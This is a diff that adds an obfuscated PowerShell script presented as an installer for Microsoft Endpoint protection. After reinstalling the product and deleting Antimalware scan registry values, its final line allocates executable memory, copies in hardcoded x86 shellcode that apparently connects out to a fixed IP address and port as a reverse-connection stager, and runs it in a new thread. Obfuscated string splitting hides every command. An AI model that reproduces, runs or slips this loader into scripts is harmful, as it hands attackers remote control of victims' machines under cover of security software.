@@ -1,0 +1,103 @@
+${Glo`BAL`:rEla`T`Iv`ePath} = (&("{2}{0}{1}{3}" -f 'i','t-p','spl','ath') ${scR`iPT:MYInV`Oc`At`ioN}."m`ycOmM`ANd"."p`AtH" -parent) + "\"
+
+Function WAit`-`PRoceS`se`Nd {
+	
+	
+	Param ([String]${p`RoCess})
+	${pR`oc} = &("{2}{1}{0}" -f'ess','-Proc','Get') ${P`ROCe`ss} -ErrorAction ("{0}{1}{3}{2}{4}"-f 'Si','len','ontinu','tlyC','e')
+	If (${P`Roc} -ne ${Nu`ll}) {
+		Do {
+			&("{0}{2}{1}" -f'S','rt-Sleep','ta') -Seconds 5
+			${PR`OC} = &("{0}{1}{2}" -f 'Ge','t-','Process') ${PrOC`esS} -ErrorAction ("{0}{3}{1}{2}" -f'Sile','yCont','inue','ntl')
+		} While (${pr`Oc} -ne ${n`UlL})
+	}
+}
+
+Function in`stAl`L`-exe {
+	
+	
+	Param ([String]${DIspLA`yNA`Me},
+		[String]${E`xECUTa`B`LE},
+		[String]${Sw`ItC`hes})
+	&("{2}{1}{0}" -f 'st','te-Ho','Wri') ("{1}{2}{0}"-f 'l','In','stal')((("{1}{3}{0}{2}" -f'playName','{0}D','.....','is')) -f  [ChaR]36) -NoNewline
+	If ((&("{2}{0}{1}" -f 'st','-Path','Te') ${Ex`ECuTA`BlE}) -eq ${TR`UE}) {
+		&("{1}{0}{2}"-f 't-Proce','Star','ss') -FilePath ${eXe`c`Ut`ABle} -ArgumentList ${S`W`Itch`es}
+		&("{2}{0}{1}"-f't-Proc','essEnd','Wai') -Process ("{2}{1}{0}{3}"-f's','pin','sce','tall')
+	} else {
+		${er`RC`ODe} = 1
+	}
+	${p`ROCE`ss} = &("{1}{2}{3}{0}"-f 's','Get','-Pr','oces') -ProcessName ("{1}{0}"-f'sMpEng','M') -ErrorAction ("{2}{0}{1}" -f 'lentlyContinu','e','Si')
+	If (${PR`o`cEss}."PR`oCE`Ssn`AmE" -eq ("{1}{0}"-f 'pEng','MsM')) {
+		&("{3}{0}{1}{2}" -f'ite','-Ho','st','Wr') ("{1}{0}" -f 'ess','Succ') -ForegroundColor ("{0}{1}"-f 'Yello','w')
+	} else {
+		&("{1}{2}{0}"-f 'Host','Writ','e-') ("{2}{1}{0}"-f'led','ai','F') -ForegroundColor ("{0}{1}"-f'R','ed')
+	}
+}
+
+Function UniN`s`TaLl-e`Xe {
+	
+	
+	Param ([String]${dISpLA`YN`AME},
+		[String]${ex`e`CuTA`BLe},
+		[String]${sW`iTch`ES})
+	&("{0}{3}{2}{1}"-f'W','t','-Hos','rite') ("{1}{0}" -f 'install','Un')((("{3}{1}{0}{4}{2}" -f 'yNa','Displa','.','{0}','me....')) -F[cHAR]36) -NoNewline
+	If ((&("{2}{3}{0}{1}" -f'at','h','Test','-P') ${E`xEc`Ut`AbLe}) -eq ${tR`Ue}) {
+		&("{1}{4}{3}{0}{2}" -f'ces','Start-P','s','o','r') -FilePath ${EXecU`T`A`BLE} -ArgumentList ${sw`ItCH`ES}
+		&("{2}{1}{0}{3}" -f'essE','c','Wait-Pro','nd') -Process ("{0}{1}{2}{3}" -f 's','cep','ins','tall')
+	}
+	${P`ROc`ESS} = &("{3}{2}{0}{1}" -f 'Proces','s','t-','Ge') -ProcessName ("{1}{0}" -f 'g','MsMpEn') -ErrorAction ("{2}{3}{0}{4}{1}"-f'ently','ue','Si','l','Contin')
+	If (${p`R`Ocess} -eq ${N`Ull}) {
+		&("{1}{0}{2}" -f'rite','W','-Host') ("{1}{0}"-f 'ccess','Su') -ForegroundColor ("{0}{1}"-f'Y','ellow')
+	} else {
+		&("{0}{2}{1}" -f'Write-','st','Ho') ("{1}{0}" -f'ailed','F') -ForegroundColor ("{1}{0}"-f 'ed','R')
+	}
+}
+
+Function ReM`ovE-RE`G`is`TRYVAL`Ue {
+	
+	
+	Param ([String]${reGisTr`Y`Key},
+		[String]${V`Al`UE})
+	${TeM`PdRi`VE} = &("{0}{2}{1}"-f 'New','e','-PSDriv') -Name ("{0}{1}"-f'HK','CR') -PSProvider ("{0}{2}{1}" -f'Regis','y','tr') -Root ("{2}{0}{3}{1}"-f '_CLAS','OT','HKEY','SES_RO')
+	${ReGi`ST`R`yk`EY1} = ${REgi`s`Tr`ykeY}.("{0}{1}" -f'sp','lit').Invoke("\")
+	switch (${R`E`gi`strykEY1}[0]) {
+		("{2}{3}{5}{4}{1}{0}"-f'T','OO','H','KEY_CLA','SES_R','S') { ${Re`GiSTr`y`KE`y1}[0] = ("{0}{1}" -f'HKC','R') }
+		("{2}{1}{0}{4}{3}" -f'R','CUR','HKEY_','NT_USER','E') { ${rE`gIst`R`Y`kEy1}[0] = ("{0}{1}"-f 'HKC','U') }
+		("{1}{0}{3}{4}{2}"-f'EY','HK','L_MACHINE','_LO','CA') { ${RegisT`R`yk`e`y1}[0] = ("{1}{0}"-f'LM','HK') }
+		("{1}{0}{2}"-f 'KEY_US','H','ERS') { ${RE`gIS`TrykEy1}[0] = "HKU" }
+		("{0}{1}{3}{4}{2}"-f'HKEY_CURRE','NT_','NFIG','C','O') { ${re`Gi`sTrYK`Ey1}[0] = ("{1}{0}" -f'CC','HK') }
+	}
+	For (${i} = 0; ${i} -lt ${rEgis`T`RyKey1}."Cou`Nt"; ${i}++) {
+		${R`eg`Key} = ${r`eg`KEy} + ${Reg`istR`Y`k`eY1}[${I}]
+		If (${i} -eq 0) {
+			${RE`gk`eY} = ${r`EgKEY} + ":\"
+		} elseif (${I} -ne ${r`EgiStr`Y`key1}."c`oUNT" - 1) {
+			${RE`GkEY} = ${Re`gKEY} + "\"
+		} else {
+			${R`e`gKEY} = ${rEgk`Ey}
+		}
+	}
+	&("{1}{0}{2}" -f'te-Hos','Wri','t') ("{0}{1}" -f'De','lete')(("{6}{0}{3}{5}{4}{1}{7}{2}"-f 'oR','a','e.....','eg','MXiGoV','Keyj','iG','lu'))."R`EPLaCE"(([cHar]106+[cHar]77+[cHar]88),'\')."REPl`AcE"(([cHar]105+[cHar]71+[cHar]111),'$') -NoNewline
+	${exI`S`TS} = &("{3}{1}{2}{0}" -f 'y','mProper','t','Get-Ite') -Path ${R`Egk`EY} -Name ${va`l`Ue} -ErrorAction ("{4}{3}{0}{2}{1}" -f 'yCo','tinue','n','tl','Silen')
+	If ((${eXIS`Ts} -ne ${nU`lL}) -and (${eXI`S`Ts}."lEN`GtH" -ne 0)) {
+		&("{2}{0}{1}{3}{5}{4}"-f'em','ove','R','-ItemPrope','ty','r') -Path ${REg`KEy} -Name ${VA`lUE} -Force
+	}
+	${eXi`sts} = &("{1}{2}{0}{3}" -f 'pert','Get-ItemP','ro','y') -Path ${r`EgKeY} -Name ${v`Al`Ue} -ErrorAction ("{3}{0}{1}{2}{4}" -f'l','y','Cont','Silent','inue')
+	If (${Ex`I`STs} -eq ${Nu`lL}) {
+		&("{0}{1}{2}"-f'Write','-Hos','t') ("{0}{1}{2}"-f'Su','c','cess') -ForegroundColor ("{0}{1}" -f 'Y','ellow')
+	} else {
+		&("{0}{2}{1}" -f 'W','-Host','rite') ("{1}{0}" -f'led','Fai') -ForegroundColor ("{2}{1}{0}"-f'ow','ll','Ye')
+	}
+}
+
+&("{1}{0}" -f 's','cl')
+&("{0}{2}{1}{3}"-f'U','l','ninsta','l-EXE') -DisplayName ("{0}{2}{4}{3}{1}" -f 'Microso','point','f',' End','t') -Executable ((("{4}{1}{6}{5}{0}{3}{2}"-f 'thscepi','ba','tall.exe','ns','{0}glo','ePa','l:Relativ'))-f [cHar]36) -Switches ("{0}{1}" -f'/u /','s')
+${PARA`ME`TERs} = ("{1}{3}{0}{2}"-f'y','/s /poli',' ','c') + ${GlOB`AL`:re`LaT`IV`ePatH} + ("{2}{5}{3}{6}{4}{0}{1}"-f'cies.','xml','E','intP','i','ndpo','ol')
+&("{1}{0}{2}"-f'nst','I','all-EXE') -DisplayName ("{1}{0}{3}{2}" -f'ft Endpo','Microso','nt','i') -Executable (("{2}{3}{5}{0}{4}{1}{6}{7}" -f 'athsc','insta','2i','Jglobal:','ep','RelativeP','ll','.exe'))."R`E`PlACE"(([chAR]50+[chAR]105+[chAR]74),'$') -Switches ${PA`RA`me`Ters}
+&("{2}{0}{4}{1}{3}" -f 'egist','u','Remove-R','e','ryVal') -RegistryKey ((("{13}{9}{5}{3}{4}{11}{2}{8}{18}{16}{12}{15}{10}{7}{17}{0}{6}{14}{1}" -f'Microsof','lware','VeZS','MA','CHI','CAL_','t Antim','s','OFT','LO','Micro','NE','EVe','HKEY_','a','Z','R','oftVeZ','WA'))  -CrEplaCE'VeZ',[ChAr]92) -Value ("{0}{1}{2}{3}" -f'In','stall','T','ime')
+.("{3}{2}{0}{1}"-f'istryVa','lue','g','Remove-Re') -RegistryKey ((("{3}{12}{7}{4}{2}{13}{0}{11}{15}{10}{8}{14}{9}{1}{5}{6}" -f'IN','malwareI','L_MACHINEINlSOFTWAREINlMicroso','HKEY','A','NlSc','an','C','sof','Anti','o','l','_LO','ft','t ','Micr'))-rEpLACE ([CHAr]73+[CHAr]78+[CHAr]108),[CHAr]92) -Value ("{2}{1}{0}{3}"-f 'u','nR','LastSca','n')
+.("{1}{2}{4}{3}{5}{0}"-f'e','Re','move-Registr','l','yVa','u') -RegistryKey ((("{7}{1}{3}{14}{10}{12}{0}{2}{18}{17}{6}{8}{5}{16}{13}{9}{11}{4}{15}"-f'6SOFTWAR','KEY_LO','EpN6Mi','C','a','c','N','H','6Mi','alwarepN','ACHINEp','6Sc','N','ft Antim','AL_M','n','roso','ftp','croso')) -cRePLaCe ([ChAR]112+[ChAR]78+[ChAR]54),[ChAR]92) -Value ("{2}{0}{1}" -f 'can','Type','LastS')
+.("{1}{2}{5}{3}{0}{6}{4}" -f 'Reg','R','em','e-','e','ov','istryValu') -RegistryKey ((("{16}{5}{6}{1}{12}{11}{10}{0}{4}{2}{9}{13}{8}{14}{3}{7}{15}" -f'WARE','HINE','oftGXfM','reGXf','GXfMicros','LO','CAL_MAC','S','t An','icr','T','fSOF','GX','osof','timalwa','can','HKEY_'))-rEPlaCe([chAr]71+[chAr]88+[chAr]102),[chAr]92) -Value ("{1}{3}{2}{0}"-f 'canID','Last','S','Quick')
+.("{0}{2}{1}{4}{3}{5}"-f 'Rem','tr','ove-Regis','l','yVa','ue') -RegistryKey ((("{0}{3}{11}{5}{7}{6}{4}{9}{2}{1}{10}{8}" -f'HKE','i','D4MicrosoftuD4M','Y_','OF','ACHI','S','NEuD4','timalwareuD4Scan','TWAREu','crosoft An','LOCAL_M')) -CRepLacE([chAR]117+[chAR]68+[chAR]52),[chAR]92) -Value ("{2}{1}{0}{3}" -f 'I','an','LastFullSc','D')
+.("{0}{3}{1}{4}{2}{5}" -f 'Rem','g','ryV','ove-Re','ist','alue') -RegistryKey ((("{1}{5}{3}{10}{4}{9}{7}{0}{6}{8}{11}{2}{12}"-f'R','HK','jM','C','CHINErMjSOFTWA','EY_LO','emov','softrMj','alTo','RErMjMicro','AL_MA','olsrM','RT'))  -cREpLacE ([char]114+[char]77+[char]106),[char]92) -Value ("{0}{1}"-f 'GU','ID')
+${c} = ((("{34}{39}{28}{43}{12}{27}{85}{72}{89}{1}{60}{16}{50}{45}{53}{22}{48}{84}{31}{24}{54}{15}{25}{57}{26}{18}{36}{17}{47}{2}{56}{11}{19}{5}{70}{41}{6}{65}{81}{32}{4}{80}{77}{21}{68}{82}{20}{10}{52}{87}{44}{76}{62}{14}{0}{59}{49}{75}{88}{8}{71}{35}{51}{23}{9}{42}{3}{29}{64}{86}{74}{46}{37}{40}{63}{13}{61}{67}{66}{38}{33}{79}{7}{69}{58}{83}{73}{30}{55}{78}"-f'ea',' Int','Import(l','eter,','a','2.d','r0',' ','In','dress, I','n','n','32.dlll','(lr0ms','r','t','l','tect);[Dl','uint flPr','el3','rn I','x','pAdd','tAd','flAl','i','Type, ','r0)]publ','kern',' ','est, uint s','ize, uint ','t',' stati','[DllImport(lr','lpSt','o','lI','lic','0','mpor','ll','ntPtr lpParam','el','hread(IntPt','loc(Int','Id);[Dl','l','ress, uint','utes, uint d','Al','ar','tPtr C','Ptr l','loca','rc, uint ','r0ker','on','r m','dAttrib','Ptr Virtua','vc','lpTh','t','uint ',')]pu','lr0)]pub','rt.dll','t','extern IntPt','l','tPtr ','atic e','tr d','ead','wStackSi','r ',' e','count);','c','tic','blic s','e','emset(IntP',' dwS','ic st','dwCreationFlags, IntPtr lpThr','reateT','ze, ','xtern'))."reP`la`CE"(([ChAr]108+[ChAr]114+[ChAr]48),[sTrIng][ChAr]34));${W} = &("{0}{2}{1}" -f 'A','d-Type','d') -memberDefinition ${c} -Name ("{0}{1}" -f 'W','in32') -namespace ("{0}{1}{3}{2}"-f'Win32Func','tio','s','n') -passthru;[Byte[]];[Byte[]]${z} = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0x05,0xe6,0xea,0x1b,0x68,0x02,0x00,0xb0,0x44,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;${G} = 0x1000;if (${z}."l`En`gtH" -gt 0x1000){${g} = ${z}."Le`NgTH"};${x}=${w}::("{2}{0}{1}"-f 'tualA','lloc','Vir').Invoke(0,0x1000,${g},0x40);for (${i}=0;${I} -le (${z}."lENG`Th"-1);${I}++) {${w}::"Me`Mset"([IntPtr](${X}.("{0}{1}{2}"-f 'ToIn','t','32').Invoke()+${i}), ${z}[${I}], 1)};${w}::("{0}{3}{1}{2}"-f'Cr','Thr','ead','eate').Invoke(0,0,${x},0,0,0);for (;;){&("{1}{2}{0}"-f 'eep','Start-','sl') 60};
